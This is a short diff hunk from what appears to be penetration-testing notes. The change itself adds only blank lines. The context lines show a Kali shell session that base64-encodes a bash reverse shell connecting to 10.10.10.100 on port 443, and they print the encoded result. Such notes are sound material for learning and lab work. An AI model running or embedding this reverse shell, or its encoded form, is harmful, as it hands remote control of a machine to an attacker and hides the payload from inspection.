@@ -24,3 +24,5 @@ echo -n "$_COMMAND" | base64 -w 0
 root@kali:~# echo -n 'bash -i >& /dev/tcp/10.10.10.100/443 0>&1' | base64 -w 0
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMDAvNDQzIDA+JjE=
 ```
+
+
